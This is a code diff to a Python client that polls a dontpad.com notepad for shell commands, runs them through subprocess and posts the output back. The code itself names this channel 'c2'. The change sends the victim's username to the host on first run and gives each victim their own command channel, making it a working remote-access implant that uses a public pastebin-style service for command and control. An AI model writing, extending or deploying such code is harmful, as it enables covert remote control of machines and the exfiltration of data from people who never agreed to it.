@@ -2,12 +2,21 @@ import requests
 import time
 import subprocess
 from observer import Observer
+import getpass
 
 class Client:
     def __init__(self, url):
         self.url = url
         self.command = ''
         self.result = ''
+        self.first_run = True
+    
+    def start(self, command_body):
+        if self.first_run:
+            self.first_run = False
+            self.send_result_to_c2()
+            
+        self.execute_command(command_body)
 
     def parse_text_dontpad(self, data):
         if "___________________" in data:
@@ -37,7 +46,7 @@ class Client:
                 encoding="utf-8",
                 errors="ignore"
             )
-            stdout, stderr = processo.communicate(timeout=60)
+            stdout, stderr = processo.communicate(timeout=20)
             if stderr:
                 return f"Erro na execução do comando: {stderr}"
             return stdout.replace("�", "")
@@ -51,14 +60,12 @@ class Client:
             "force": "true",
             "session-token": "-25751fc88e6e559870fd"
         }
-        response = requests.post("https://api.dontpad.com/yaguinhofodinha", data=data)
+        response = requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}", data=data)
         print(f"Send result: [{response.status_code}] - {data}")
 
 
-
-
 if __name__ == "__main__":
-    url = "https://api.dontpad.com/yaguinhofodinha.body.json?lastModified=0&session-token=-25751fc88e6e559870fd"
-    client = Client(url=url)
-    observer = Observer(url=url, client=client)
+    url_with_username = f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}.body.json?lastModified=0&session-token=-25751fc88e6e559870fd"
+    client = Client(url=url_with_username)
+    observer = Observer(first_url="https://api.dontpad.com/yaguinhofodinha.body.json?lastModified=0&session-token=-25751fc88e6e559870fd", url_with_username=url_with_username, client=client)
     observer.start()
